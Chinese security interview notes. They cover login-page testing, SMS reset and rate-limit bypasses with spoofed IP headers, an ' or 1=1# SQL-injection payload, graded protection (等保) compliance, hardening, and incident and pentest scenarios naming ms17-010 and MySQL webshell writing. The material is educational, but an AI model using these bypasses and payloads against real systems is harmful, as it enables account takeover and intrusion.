16、任意文件下载

### 3、只有一个登录页面如何测

#### 1. 测试逻辑漏洞点

密码找回方式，发送邮件、手机号是否可以拦截

登录时是否为前端认证，通过修改HTTP回显包是否可以绕过

注册功能是否可以覆盖注册admin，注册页面是否存在二阶注入

验证码是否可以绕过

用户名是否可以进行暴力破解

#### 2. SQL注入漏洞

登录处是否存在报错注入、联合、盲注

注册是否存在SQL注入漏洞

密码找回处是否存在SQL注入

#### 3. JS代码是否存在 JS接口泄露

有些功能点屏蔽掉，但是JS代码可以看到，通过控制台可以触发

通过JSfinder查看是否存在可以利用的接口

通过源码查看是否存在接口泄露

#### 4. 目录扫描

探测是否存在未授权访问

探测二级目录、三级目录、robots.txt

#### 5. 查看漏洞库是否存在历史漏洞

#### 6. 提取登录页面关键字，通过fofaAPI工具去搜，看看有无站点源码泄露去代码审计

### 4、web短信重置密码有可能有哪几种绕过方式

1，短信验证码可爆破；

2，短信验证码显示在获取验证码请求的回显中；

3，注册手机号及短信验证码未进行匹配性验证；

4，用户名、手机号码、短信验证码三者没有进行匹配性验证；

5，短信验证码的验证在本地客户端进行验证；

6，重置步骤未进行校验；

7，重置请求未验证身份；

8，登陆成功修改密码功能平行越权；

9，未校验身份信息的唯一标识cookie信息；

### 5、绕过登录次数限制的技巧

1.自定义请求方法

如果请求GET 尝试将其更改为POST、PUT 等，

如果你想绕过 API 的请求限制，尝试HEAD方法。

2.向请求头添加欺骗IP

X-Forwarded: 127.0.0.1

X-Forwarded-By: 127.0.0.1

X-Forwarded-For: 127.0.0.1

X-Forwarded-For-Original: 127.0.0.1

X-Forwarder-For: 127.0.0.1

X-Forward-For: 127.0.0.1

Forwarded-For: 127.0.0.1

Forwarded-For-Ip: 127.0.0.1

X-Custom-IP-Authorization: 127.0.0.1

X-Originating-IP: 127.0.0.1

X-Remote-IP: 127.0.0.1

X-Remote-Addr: 127.0.0.1

或者使用两个或以上参数

X-Forwarded-For:

X-Forwarded-For: IP

3. 使用特殊字符绕过限制

在电子邮件末尾添加空字节 ( %00 ) 有时可以绕过限制。

尝试在电子邮件后添加空格字符。（未编码）

一些有助于绕过速率限制的常用字符：%0d、%2e、%09、%20、%0、%00、%0d%0a、%0a、%0C

比如email=abc@g.com,a&password=password123

在 api 地址末尾添加斜杠（/）也可以绕过限制。

domain.com/v1/login->domain.com/v1/login/

4.使用 IP 轮换 Burp 扩展

如果限制每个 IP 尝试 10 次，则每 10 次尝试都会更改请求头内的 IP

Burp插件https://github.com/PortSwigger/ip-rotate

5.如果遇到的是验证码时

尝试从请求正文中删除验证码参数

尝试添加一些与参数长度相同的字符串

保持Intercept打开，向Intruder发送请求。有时，它可能会产生意想不到的结果

6. 使用 Turbo Intruder

https:*//blog.csdn.net/weixin_50464560/article/details/120351881*

https:*//github.com/PortSwigger/turbo-intruder/releases/download/1.0.12/turbo-intruder-all.jar*

7. 使用忘记密码页面

有时忘记密码页面会解锁用户帐户。当用户帐户由于登录次数过多锁定时，攻击者可以通过点击忘记密码发送邮件后解锁用户帐户来继续他的暴力攻击。

8. 检查 Cookie 或 CSRF 值

网站使用 cookie 或 csrf 令牌来验证每个请求。因此可以尝试删除这些值并尝试绕过限制，或者可以自己生成这些令牌并使用来测试暴力攻击。

https:*//www.cyberick.com/post/tricks-to-bypass-rate-limiting-on-login-page-bug-bounty-tips*https:*//github.com/KathanP19/HowToHunt/blob/master/Rate_limit/RateLimitBypass.md*

### 6、登录框常见漏洞

#### 1、常规漏洞

sql注入、万能密码

我们在用户名中输入 ‘or 1=1#，密码随意。

就变成了select name.passwd from users where username= ‘’ or 1=1#’ and password=???。

在SQL语法中 ## 是注释符，所以后面的语句都会杯注释掉，那么上面的语句就等价于select name.passwd from users where username=’’ or 1=1。

在or 连接中， username=’’ 和 1=1 中有一个为真就为真。所以1=1肯定为真。

如果存在sql注入的漏洞，则可以直接登录进去。

url重定向

网站接受用户输入的链接，跳转到一个攻击者控制的网站，可能导致跳转过去的用户被黑客设置的钓鱼页面骗走自己的个人信息和登录口令。

未授权访问

未授权访问漏洞，是在攻击者没有获取到登录权限或未授权的情况下，不需要输入密码，即可通过输入网站控制台主页面地址或者不允许查看的连接便可进行访问，同时进行操作。

修改返回包

由于对登录的账号及口令校验存在逻辑缺陷，以再次使用服务器端返回的相关参数作为最终登录凭证，导致可绕过登录限制

如服务器返回一个参数作为登录是否成功的标准，由于代码最后登录是否成功是通过获取这个参数来作为最终的验证，所以。

渗透人员通过修改参数即可绕过登录的限制！

越权

登录框处同样存在越权：

平行越权：获得相同等级的其它用户的权限；

垂直越权：低权限用户获取高权限用户的权限，例如:用户权限获得管理员权限，或者超级管理员权限。

目录遍历、信息泄露

目录遍历漏洞是由于web中间件目录访问相关的配置错误造成的，该漏洞会泄露web应用程序的敏感路径、敏感的文件信息、网站的编辑器路径或测试接口、系统敏感目录等信息。

造成漏洞原因

程序在实现上没有充分过滤用户输入的…/之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。

跨站脚本攻击

分三类：反射型、存储型、DOM型

利用：获取cookie，钓鱼

这里我就不细说了

2、用户相关

明文传输、用户名遍历

在登录框BP抓包，发现用户名、密码是明文传输的，即客户端与服务器的数据传输未加密。

危害：攻击者可能通过劫持ARP欺骗、嗅探Sniffer、等手段截获敏感数据，若获取用户名和密码信息，可以进入到系统当中。

漏洞挖掘：

1、查看是否使用HTTPS协议2、用户名、密码是否加密

任意用户注册

利用：在登录框处输入手机号，密码，验证码随便填，BP抓包，尝试验证码爆破

任意密码重置

任意账号密码重置的6种方法，这里深入讲一下：

1、短信验证码回传：

通过手机找回密码，响应包中包含短信验证码。

修复建议：响应包中去掉短信验证码。

2、修改用户名、用户ID或手机号重置任意账号密码:

通过手机找回密码一般需要短信验证码验证。

当我们输入正确的手机号和正确的短信验证码，然后进入重置密码的最后一步，也就是输入新的密码输入密码后提交到服务端的post数据包需要包含当前用户的身份信息。

而一般网站是通过用户名或用户ID来标识用户身份的，如果这个用户名或用户ID没有和当前手机号、短信验证码进行绑定；

也就是说服务端只验证用户名、ID是否存在，而不去验证用户和当前手机号是否匹配，那么我们就可以通过修改用户名、ID去修改其他用户的密码了。

也可以修改的地方不限于找回密码的数据包，比如修改资料的地方也可能存在这样的漏洞。

修复建议：

用户操作个人信息时，服务端要对当前用户身份进行验证，防止越权操作；用来标识用户身份的名称或ID可以使用自定义加密，也可以隐藏这些参数，直接从cookie中获取用户信息；用户修改密码时应该先对旧密码进行验证，或者使用手机短信验证；用户修改手机号时需要先对原手机号进行验证。

3、修改响应包重置任意账号密码：

通过手机找回密码一般需要短信验证码验证，服务端需要告诉客户端，输入的验证码是否正确。

如果客户端收到true的信息，那么就会向带着true的信息向服务端请求进入下一步，而服务端收到true的信息，就会允许客户端进入下一步。

反之，如果是false的信息，服务端就不会允许客户端进入下一步。

所以我们进入下一步的关键是让服务端收到客户端的true信息。

而通过Burpsuite，我们可以修改服务端返回到客户端的信息，这样一来，我们就可以输入任意短信验证码，然后将服务端返回的false信息改为true就可以绕过短信验证码的验证了。

服务端对验证码进行验证，结果为true时直接跳到下一步，无需向客户端单独返回验证结果；输入新的密码，然后提交到服务端，服务端应对当前用户名、手机号、短信验证码进行二次匹配验证，都为true时，才可以修改成功。

4、跳过验证步骤重置任意账号密码：

找回密码流程一般需要四个步骤：

1、验证用户名；

2、验证短信验证码；

3、输入新密码；

4、重置成功。

利用思路：第一步正常输入用户名，第二步输入任意验证码，直接访问输入新密码，重置密码。

原因：当我们输入新的密码后，提交到服务端，服务端并没有对当前用户身份进行二次验证，只是简单的获取到用户名或ID以及新密码，从而导致跳过短信验证码验证重置任意账号密码。

每一个步骤都要对前一个步骤进行验证；最后提交新密码时应对当前用户名或ID、手机号、短信验证码进行二次匹配验证。

5、重置密码链接中token值未验证或不失效导致任意账号密码重置：

使用邮箱重置密码时，服务端向邮箱发送一个重置密码的链接，链接中包含当前用户的身份信息和一个随机生成的token信息，如果未对token值进行验证或是验证后不失效，我们就可以通过修改用户名或用户ID来重置任意账号密码。

修复建议：

服务端对客户端提交的token值进行验证；保证token值使用一次后即失效，防止重复使用；对用户ID进行自定义加密；使用根据用户ID生成的token值来标识用户，链接中不携带用户ID。

6、找回密码的短信验证码可被爆破导致任意账号密码重置：

找回密码时使用位数较少的短信验证码，或者验证码没有设置有效时间限制，导致攻击者借助自动化工具（例如BP）进行爆破获得短信验证码，从而导致重置任意账号密码。

验证码满足一定复杂度，且限制验证码生效时间；验证短信验证码的数据包使用token值并验证，防止自动化工具爆破

弱口令

短信相关漏洞

短信轰炸

短信炸弹是利用互联网第三方接口发送垃圾短信轰炸，只需输入手机号码就可以利用网络短信无限轰炸对方手机，具有恶意骚扰功能的软件。

短信验证码爆破

上面讲到过了，例如：用BurpSuite爆破。

验证码回显

思路：登录接收验证码时，BP抓包，可以看到验证码回显在返回包中。

万能验证码

类似于弱口令，程序员开发为了方便，设置比较简单，例如8888、0000等。

验证码失效、未与用户绑定

#### 2、搜索框存在什么漏洞？

SQL注入:SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的"数据"拼接到SQL语句中后，被当作SQL语句的一部分执行，从而导致数据库被增、删、改、查的危害。xss漏洞

#### 3、新增主题、添加用户处存在什么漏洞

越权sql注入文件上传未授权登录csrf

#### 4、导入、导出excel处存在什么漏洞

任意文件读取、下载任意文件上传漏洞xxe

#### 5、内容编辑处存在什么漏洞

xsssql注入越权文件上传编辑器：fckeditor、ueditor

#### 6、修改头像处

文件上传：getshell、xss越权

#### 7、页面内容浏览处一般存在漏洞

越权sql注入

### 7、给你一个网站，你有什么思路。你看到这个网站有找回密码的功能，你有什么思路。

忘记密码功能，看看是否是发送验证码，如果显示手机号，尝试能不能修改，发送的验证码返回包中是否返回，如果不返回，尝试是否能爆破，看看是否能饶过发送验证过步骤直接跳转到修改密码阶段等等。

# 安全等保

### 1、等级保护工作流程

定级备案（梳理信息系统情况，确定等级，提交定级报告和备案表到当地网警部门）

差距评估（聘请第三方测评机构，进行安全检查和评估，找出现状问题，提交问题报告和整改方案）

（物理）（网络）（主机）（应用）（数据及备份）（安全管理）

整改建设（根据差距评估结果，进行技术、产品、人工、管理制度等方面的整改建设工作）

等级评测（聘请第三方测评机构，进行等级保护测评工作，提交相应的等级保护测评报告到网警部门）

A：第一步是进行备案资料准备。将定级报告、备案表、网络与信息安全承诺书、网络安全等级保护应急联系登记表、专家评审意见、相关证件原件扫描件等纸质备案资料提交给所分管的分局（据各区分局情况有不同要求），备案环节大约五个工作日左右（取决于不同分局的工作进度情况）。

第二步，专家定级评审会。邀请三位专家就信息系统定级情况组织开展定级评审会议，论证信息系统定级的合理性，以及相关备案材料的修改和确定。最终专家签字专家评审意见。这一环节一个工作日即可完成。

第三步，线上提交备案材料，进行初测。备案单位线上进入等级保护备案预约平台，注册申请本单位账号，待公安审核，下发登录方式和账号密码。这一环节取决于公安审核速度，一般在10个工作日内。

如若查询到注册结果通过，登录上系统账号和密码后，进行备案申请、提交备案相关材料上传后，待公安部门对材料审核，通过后待公安通知领取备案证明时间，同时提交纸质版备案材料。领取备案证明后电子版发给测评机构，测评机构办理入场测评登记。这一环节取决于公安审核速度，一般在10个工作日左右。

依据等级保护测评要求开展等级保护测评工作及漏洞扫描、渗透测试等，即初测，出具差距分析报告及整改意见。这一环节取决于公安审核速度，一般在10个工作日左右。

第四步，根据初测整改意见进行整改，再进行复测。整改过程取决于备案单位整改效率，复测进展一般在七个工作日左右完成，十五个工作日左右出结果。

第五步，提交测评报告，测评机构把测评报告盖章后给备案单位，再提交给网安大队，项目结束。这一步约10个工作日。而只有具有公安部颁发资质的测评机构才有测评报告的印章。

### 等保二级和三级必备安全设备有哪些

等保二级：机房防盗报警系统、灭火设备火灾自动报警系统、机房专用空调、UPS、防火墙、准出控制设备、IDS或IPS、日志审计系统 日志服务器、网络版杀毒软件、数据备份系统、漏洞扫描设备

等保三级：电子门禁系统、机房防盗报警系统监控报警系统、火灾自动消防系统、水敏感检测设备、机房专用空调、UPS或备用发电机、负载均衡、防火墙、准出准入设备、

IDS或IPS、防病毒网关或UTM、防火墙、日志审计系统数据库审计系统 日志服务器、网络版杀毒软件、运维管理系统、堡垒机+Ukey认证、数据备份系统异地容灾、漏洞扫描设备

### 等保包含哪些内容

【物理安全】

　　 　　机房物理访问控制、防火，防雷击，温湿度控制、电力供应，电磁防护。

【应用安全】

　　　　 应用具备身份鉴别、访问控制、安全审计、剩余信息保护、软件容错、资源控制和代码安全。

【通信安全】

　　　　 包括网络架构，通信传输，可信验证。

【边界安全】

　　　　 包括边界防护，访问控制，入侵防范，恶意代码防护等。

【环境安全】

　　　　 入侵防范，恶意代码防范，身份鉴别，访问控制，数据完整性、保密性，个人信息保护。

【管理安全】

　　 　　系统管理，审计管理，安全管理，集中管控。

### 等保测评流程是怎么样的？

等保包括五个阶段：1、定级、2、备案、3、建设整改、4、等级测评、5、监督检查。定级对象（即需要过等保的对象）建设整改后，需要选择符合国家要求的测评机构，按《网络安全等级保护基本要求》等技术标准进行等级测评，之后向监管单位提交测评报告。

### 最后找哪里找检测公司？

依据[全国网络安全等级保护测评机构推荐目录](http://www.cnqk.net/?lid=247&slid=247&winde=cp&lmlx=more&moid=740)去找就行啦，一般同省内，所有检测公司都是有效的。

### 如何开发一个等保的系统？

1、程序开发：开发一个满足等保要求的程序是必须的。

2、网络产品：依据需要配备WAF防火墙、DDoS防护、堡垒机、SSL证书、SLS审计日志等产品。

3、管理制度：等保要求建立安全管理制度，该制度需要用户结合自身实际情况自行建立和执行。

4、等保测评：通过等保测评公司名录寻找当地测评公司，注意只需要同省即可，可多咨询几家公司。

### 等级保护的测评时长？多久可以完成？

取决于当地公安等部门情况，一般整个流程在2至3个月内可以结束。

### 等级保护的测评周期？多久做一次等保测评？

二级信息系统每两年测评一次；三级信息系统每年测评一次；四级信息系统每半年测评一次。五级属于特殊范畴进行特殊审查。一般企业的信息系统定级都在二级、三级。

|前期调研阶段|基本信息调研|1 客户信息系统基础情况调研；|《客户基本情况调研表》|
| ----------------| ------------------------------------------------------------------------------| ------------------------------------------------------------------------------------------------------------| ------------------------|
|安全规划方案|1. 提供等级保护整改建设或规划设计方案|《XX系统等级保护安全规划设计方案》初稿||
|方案交流确认|方案交流、调整。确认|《XX系统等级保护安全规划设计方案》最终稿||
|项目准备阶段|项目启动会|项目启动会、|《项目启动会PPT》|
|项目实施方案|编写实施方案、安排、人员分工|《项目实施计划表》||
|信息系统调研|信息系统资产、环境、组织、管理、应用系统等详细信息调研|《信息系统基本情况调研表》||
|定级备案阶段|定级报告|根据定级指南，编写定级报告|《信息系统定级报告》|
|网安对接|对接当地网安，确认备案流程及材料要求|《备案表》||
|专家评审|协助客户准备专家评审材料，协助组织专家评审|1、专家评审会议材料； 2、《信息系统定级报告》||
|备案材料|协助客户梳理备案材料，审核材料|《系统网络拓扑图及说明》《资产清单》《安全设备清单》《计算机安全专用产品销售许可》《系统组织机构及管理制度》||
|提交备案|协助客户正式提交备案|《备案证明》||
|差距分析阶段|评估准备|差距评估工具准备；核对信息系统资产信息|《差距评估实施方案》|
|技术差距分析|技术层面差距分析，包含安全物理环境、网络安全、主机安全、应用安全、数据安全|||
|管理差距分析|管理层面，安全管理制度、安全管理机构、人员安全管理、系统建设管理、系统运维管理|||
|差距分析报告编写|汇总差距调研资料，编差距分析报告及整改建议|《差距分析报告》||
|安全现状分析|针对技术差距问题和管理差距问题，提出安全现状分析|《安全现状分析报告》||
|漏洞评估|利用工具对主机、系统资产进行漏洞识别|《漏洞扫描申请书》《系统漏洞扫描报告》||
|整改建设阶段|安全整改实施方案编写|根据差距分析的结果，制定整改实施方案|《系统安全整改实施方案》|
|产品采购|指导客户购买安全设备|||
|安全产品上线|自供安全产品的实施，客户自采安全产品上线合规指导|《设备配置实施报告》||
|技术部分整改|协助各管理员对差距问题进行符合性安全整改加固|《系统整改加固实施记录》||
|管理部分整改|信息安全管理体系的表单、记录、报告|相关体系文件||
|漏洞修复整改|协助客户完成高风险漏洞和高风险差距问题整改修复|《漏洞修复实施记录》||
|整改确认|确认，与客户确认，达到等级保护相应级别和建设目标的要求，具备测评机构进场的条件|《系统安全整改实施报告》||
|协助测评阶段|测评项目启动|提交测评所需的资料||
|差距测评|协助客户完成现场首次测评|||
|安全整改|对测评机构给出的测评整改建议，进行评估，二次整改|《整改记录》||
|验证测评|配合完成验证测评|||
|项目验收阶段|安全培训||项目实施总结及安全培训|
|验收文档整理||项目资料移交||
|项目验收||项目验收：1.《备案证明》；2.《系统测评报告》；3.项目文档||

### 2、等保2.0与等保1.0区别

等保1.0（2007年和2008年）

等保2.0（2019年5月10日）-2019.12.1正式实施

区别：等保1.0主要强调物理主机、应用、数据、传输，而2.0版本增加了对云计算、移动互联、物联网、工业控制和大数据等新技术新应用的全覆盖

第一，名称变化。等保2.0将原来的标准《信息安全技术信息系统安全等级保护基本要求》改为《信息安全技术网络安全等级保护基本要求》，与《网络安全法》保持一致。

第二，定级对象变化。等保1.0的定级对象是信息系统，现在2.0更为广泛，包含：信息系统、基础信息网络、云计算平台、大数据平台、物联网系统、工业控制系统、采用移动互联技术的网络等。

第三，安全要求变化。基本要求的内容，由安全要求变革为安全通用要求与安全扩展要求(含云计算、移动互联、物联网、工业控制)。

第四，控制措施分类结构变化。等保2.0依旧保留技术和管理两个维度。

在技术上，由物理安全、网络安全、主机安全、应用安全、数据安全，变更为安全物理环境、安全通信网络、安全区域边界、安全计算环境、安全管理中心；

在管理上，结构上没有太大的变化，从安全管理制度、安全管理机构、人员安全管理、系统建设管理、系统运维管理，调整为安全管理制度、安全管理机构、安全管理人员、安全建设管理、安全运维管理。

第五，内容变化。从等保1.0的定级、备案、建设整改、等级测评和监督检查五个规定动作，变更为五个规定动作+新的安全要求(增加了风险评估、安全监测、通报预警、案事件调查、数据防护、灾难备份、应急处置等。)。

第六，法律效力不同。《网络安全法》第21条规定"国家实行网络安全等级保护制度，要求网络运营者应当按照网络安全等级保护制度要求，履行安全保护义务”。落实网络安全等级保护制度上升为法律义务。

### 3、等保2.0有5个运行步骤

等保2.0有5个运行步骤：定级备案、差距评估、建设和整改、等级测评、检查。同时，也分5个等级，即信息系统按重要程度由低到高分为5个等级，并分别实施不同的保护策略。

一级系统简单，不需要备案，影响程度很小，因此不作为重点监管对象;

二级系统大概50万个左右;

三级系统大概5万个;

四级系统量级较大，比如支付宝、银行总行系统、国家电网系统，有1000个左右;

五级系统属国家级、国防类的系统，比如核电站、军用通信系统。

### 4、对于工业控制系统如何开展等级保护工作？

依据等保基本要求中的安全通用要求和工控扩展要求来对工业控制系统开展等级保护工作。

工业控制系统主要包括现场采集/执行、现场控制、过程控制和生产管理等特征要素。其中，现场采集/执行、现场控制和过程控制等要素应作为一个整体对象定级，各要素不单独定级；生产管理要素可单独定级。

对于大型工业控制系统，可以根据系统功能、责任主体、控制对象和生产厂商等因素划分为多个定级对象。

工控扩展要求保护主要包括：室外控制设备防护、工业控制系统、网络架构安全、拨号使用控制无线使用控制、控制设备安全、漏洞和风险管理、恶意代码防范管理等方面内容。

工业控制系统安全扩展要求主要针对现场控制层和现场设备层提出特殊安全要求，其他层次使用安全通用要求条款，对工业控制系统的保护需要根据实际情况使用基本要求。

《网络安全法》中第二十一条和第三十一条

### 5、2.0二级与三级要求项

要求项：二级135项 三级211项

控制点：二级68个 三级71个

### 6、安全整改从哪几个方面入手

安全策略配置（针对用户单位实际情况和等级保护要求，制定相关设备的安全策略要求，并合理配置）

安全加固（针对差距评估中自身安全策略配置不当和版本补丁问题进行处理，包括调整自身安全策略、升级补丁和打补丁）

安全管理制度整理（根据差距评估的结果，针对目前缺少的安全管理制度进行补充，并编写过程模板）

安全设备采购部署（根据设计方案内容，用户单位完成安全设备的采购和部署）

# 风险评估

### 1、风险评估4要素

信息资产，弱点/脆弱性、威胁和风险

### 2、风险评估安全服务流程

第一阶段

项目准备（对信息系统风险评估项目目标、范围、项目交付文件、项目实

施方案、工作方式、评估成果提交形式讨论确定。）

项目启动（启动信息系统风险评估工作。）

第二阶段

· 资产识别

对被评估信息系统的关键资产进行识别，并合理分类；

· 威胁识别

识别被评估信息系统的关键资产所面临的威胁源，及其威胁所常采用的威胁方法，对资产所产生的影响。

· 脆弱性识别

将针对每一项需要保护的信息资产，找出每一种威胁所能利用的脆弱性，将从安全管理脆弱性以及技术脆弱性两个方面进行脆弱性检查。

· 安全措施识别

识别被评估信息系统的有效对抗风险的防护措施。

第三阶段

· 资产分析

分析被评估信息系统及其关键资产在遭受泄密、中断、损害等破坏时对系统所承载的业务系统所产生的影响，并进行赋值量化。

· 威胁分析

分析被评估信息系统及其关键资产将面临哪一方面的威胁及其所采用的威胁方法，并进行赋值量化。

· 脆弱性分析

分析被评估信息系统及其关键资产所存在的管理脆弱性和技术脆弱性，并进行赋值量化。

· 综合风险分析

分析被评估信息系统及其关键资产将面临哪一方面的威胁及其所采用的威胁方法,利用了系统的何种脆弱性，对哪一类资产，产生了什么样的影响，并描述采取何种对策来防范威胁，减少脆弱性，同时将风险量化

第四阶段

· 风险规划

明确组织的安全需求，制定安全规划对风险进行处理。

· 成果汇报

提交评估成果系列报告同时为客户讲解评估过程及结果，对每个安全问题提出解决建议或整改措施；

· 项目验收

客户达成安全成果共识，项目验收。

# 风险评估

阶段一

签订安全保密协议

出风险评估实施方案

阶段二

先进行资产识别 （比如一些网络、主机应用软件等）

再通过讨论看是否进行填写一些人员、服务、数据、安全措施等调研表

威胁识别

脆弱性识别 物理环境 网络环境 主机系统 数据库系统 应用中间件系统 安全管理脆弱性

安全措施识别 看已有安全措施存在哪些有限性

签订漏洞检测安全服务实施申请书

阶段三

· 资产分析 硬件资产分析 软件资产分析 数据资产分析 人员资产分析 服务资产

分析被评估信息系统及其关键资产在遭受泄密、中断、损害等破坏时对系统所承载的业务系统所产生的影响，并进行赋值量化。

· 威胁分析

分析被评估信息系统及其关键资产将面临哪一方面的威胁及其所采用的威胁方法，并进行赋值量化。

脆弱性分析 物理环境 网络环境 主机系统 数据库系统 应用中间件系统 安全管理脆弱性

·

分析被评估信息系统及其关键资产所存在的管理脆弱性和技术脆弱性，并进行赋值量化。

综合风险分析 按5个等级进行划分 很低1-12 低13-24 中25-36 高37-48 很高49-125 等级越高 风险越高

四阶段

风险规划

出整改建议 安全技术：物理基础环境-网络基础环境-防病毒策略-系统安全加固

安全管理：安全管理制度-安全管理机构-安全人员管理-系统运维管理

成果验收

项目验收

# 了解过系统加固吗？

账户安全

windows

比如设置登录时不显示上次登录的用户名，防止弱口令爆破。

设置账户锁定策略，比如说登录行为限制次数，达到次数后锁定多长时间。

linux

禁用root之外的超级用户 使用password -l <用户名>命令来锁定用户 -u解锁

限制普通用户使用sudo提权，或者说限制提权的权限大小

锁定系统中多余的自建账号

设置账户锁定登录失败锁定次数，锁定时间 faillog -u <用户名>命令来解锁用户

口令安全

windows

设置密码必须符合复杂性要求，比如设置时数字，大写字母，小写字母，特殊字符都要具备

设置最小密码长度不能为0，设置不能使用历史密码

linux

检查shadow中空口令账号，修改口令复杂度，设置密码有效期vim /etc/login.def命令

服务与端口收敛

关闭或者限制常见的高危端口，比如说22端口(SSH)，23端口(Telnet)，3389端口(RDP)

compmgmt.msc排查计划任务

linux上iptables封禁IP或者限制端口

文件权限管理

linux上chmod修改文件权限 chattr重要文件设置不可修改权限

系统日志审计

linux上设置系统日志策略配置文件

系统日志 /var/log/message

cron日志/var/log/cron

安全日志/var/log/secure

设备和网络控制

比如在涉密计算机上禁止访问外网，为了避免用户绕过策略可以禁止用户修改IP

删除默认路由配置，避免利用默认路由探测网络

禁止使用USB设备比如U盘

禁止ping命令，即禁用ICMP协议访问，不让外部ping通服务器

# 场景

## 如何检查mongodb未授权访问漏洞

方法一：

使用mangodb_unauth.py脚本进行处理，将ip地址放进target.txt

用法为：python mangodb_unauth.py target.txt

方法二：

使用nmap插件，命令为：nmap -p 27017 --script mongodb-info 192.168.0.1/24

## Zookeeper 未授权访问的检查方法

telnet zookeeper端口 输入envi，回显路径等信息则存在zookeeper未授权访问漏洞

### 请列出让客户满意的Zookeeper未授权访问漏洞的修复方案

根据客户实际情况可以提供以下修复方案：

\1. 禁止将zookeeper暴露在公网

\2. 使用iptables对端口进行访问控制

\3. 添加访问控制，根据情况选择对应方式（认证用户，用户名密码）

\4. 绑定指定IP访问

## 批量检查http服务使用什么工具和简略使用步骤

方法1

直接使用nmapsV.py工具即可，用法为python3 nmapsV.py ip.txt result.txt

方法2

## 存活性探测的简要步骤

使用nmap工具进行存活性探测 使用nmap，命令nmap -sP -n -iL ip.txt -oA OUTPUT --no-stylesheet

在Linux中使用cat OUTPUT.gnmap |grep Up |awk ‘{print $2}’ > ip_cunhuo.txt 即可得到存活IP

## 一个大范围影响的0day被曝光，作为甲方安全工程师，应该如何处理(★★)

首先是评估 0day 对自身系统的影响（这部分评估需要根据漏洞利用的利用点、是否需要交互、是否会影响系统的 CIA，是否有在野利用 poc，影响资产是否暴露在公网等很多因素决定，）

如果确定有影响的话且有 poc，第一件事是先分析 poc 执行后会在什么地方留下痕迹，我们有什么样的设备去采集这些痕迹所留下的数据，比如说 ntlm relay 这种，可以考虑从 Windows 事件日志当中 event_id 等于 4769 的事件入手编写对应的规则，这样的话可以利用 SIEM 或者实时日志分析平台跑起来，可以建立起初步的感知防线，后期触发告警，人肉运营也可以快速止损

日常建立完整的纵深防御体系，不要依赖于某一道防线

## 假设客户中了GhostPetya勒索病毒向你咨询解决方案，请描述需要告诉他应该做些什么，如何去应急处置和善后补救

13.1 未部署端点安全的终端应急解决方案

1.做好重要文件的备份工作（非本地备份）。

2.开启系统防火墙。

3.利用系统防火墙高级设置阻止向445端口进行连接（该操作会影响使用445端口的服务）。

4.打开系统自动更新，并检测更新进行安装。

5.停止使用Windows XP、Windows 2003等微软已不再提供安全更新的操作系统。

6.如无需使用共享服务建议关闭该服务。

13.2 已部署端点安全的终端应急解决方案

1.如果用户已经部署终端管理类产品，可通过终端管理软件进行内网打补丁。

2.通过主机防火墙关闭入栈流量。主机防火墙关闭到445出栈流量。

3.开启文件审计，只允许word.exe，explorer.exe等对文件访问。

13.3 已经感染应急解决方案

1.断开网络连接，阻止进一步扩散。优先检查未感染主机的漏洞状况（可直接联系服务公司，提供免费检测工具使用），做好漏洞加固工作后方可恢复网络连接。

2.已经感染终端，根据终端数据类型决定处置方式，如果重新安装系统则建议完全格式化硬盘、使用新操作系统、完善操作系统补丁、通过检查确认无相关漏洞后再恢复网络连接。

预防措施

打补丁：及时给系统打补丁，修复漏洞。

装杀软：安装杀毒软件，及时更新病毒库。开启防火墙，并升级到最新版本，阻止勒索病毒与其C&C服务器通信。

做备份：定期对重要文件以及数据库做非本地备份。电脑开启系统备份，并添加保护（这样可通过卷影备份将系统恢复到被加密之前的状态）。

备份恢复：如果事先已对关键文件做了备份，在确保已清除病毒情况下可做数据备份恢复。如果卷影备份未被勒索病毒删除，可通过卷影备份将系统恢复到未感染勒索病毒的时间点。

改密码：使用长度大于10位的复杂密码。

加限制：禁用GUEST来宾用户。尽量不要使用局域网共享，或把共享磁盘设置为只读属性，不允许局域网用户改写文件。尽量关闭不必要的端口，如：445、135、139、 3389、5900 。

防钓鱼：不要点击来源不明的邮件以及附件，钓鱼邮件是勒索病毒的重要传播源。

## 假设发现数据库短时间内查询异常次数增多，描述sql查询异常流量分析的思路。

数据库短时间内查询增多有可能遭遇到了扫描或者sql注入测试，可以结合流量分析工具进行研判

select 和 union 为数据库查询语句特征，当这两者数量出现次数较多而且差异较小可能存在SQL注入漏洞或正在被扫描器扫描，可监控这两个关键字，但还需要进一步查看具体请求参数

如：

\1) 使用wireshark打开抓取后的流量包。

\2) 对于抓取到的数据包筛选出HTTP协议包，在统计处筛选出短时间内流量较大的IP

\3) 尝试定位一些基本的注入特征（select、union、()、/*、sleep等）

\4) 筛选出可以攻击IP，分析流量包HTTP流。即可定位

## 假设发现web应用服务器发现文件异常增多，初步怀疑被上传webshell，描述流量分析溯源的思路。

可利用流量工具进行溯源：

1） 查看eval、z0、shell、whoami等关键字，查看出现次数过多的时候，可能需要查看是哪个页面发起的请求，有可能是webshell

2） 通过WireShark工具快速搜索关键字，定位到异常流量包

3） 找出异常IP和所上传的内容，查看是否为webshell

如何定位到攻击IP:

\1) 首先通过选择-统计-对话查看流量的走向情况，定位可疑的IP地址

\2) 根据定位到的IP地址，尝试对上传的webshell进行定位ip.addr == ip && http matches "upload||eval|select|xp_cmdshell”&& http.request.method == "POST”

\3) 查找到Webshell后尝试溯源漏洞位置，http.request.uri contains "webshell.php”，定位到最开始webshell执行或上传的时候

\4) 根据最开始的HTTP上传包或者其他漏洞特产定位漏洞类型

## 假设渗透时发现服务器开了21，80，445，3306，11211端口，你有什么渗透思路。

\1) 针对21端口 21端口开放表明运行这FTP服务，可以尝试对FTP进行爆破和尝试匿名anonymous/空登陆。以及使用MS12-073的攻击尝试。

\2) 80端口对应web服务，可通过信息收集，分析出去中间件类型和版本，后端语言类型。还有CMS类型，看是否可有已知漏洞可利用。若无，对Web站点进行渗透测，查看是否存在注入等漏洞。

\3) 445端口对应网络共享SMB服务，可尝试利用ms08-067，ms17-010等溢出漏洞对服务器进行攻击。也可以尝试使用IPC$进行攻击

\4) 对于3306 mysql端口也可以采用爆破的方式。成功后，可以用mysql写webshell，或者构造VBS写入服务器启动项，带服务器重启就可以添加管理员账号和打开3389端口。

\5) 11211端口是memcached服务的端口。memcache默认情况下存在未授权访问漏洞，telnet ip 就可以获得服务器敏感信息。对进一步渗透提供帮助

## 假设渗透时发现服务器开了22，8080，8161，6379端口，你有什么渗透思路。

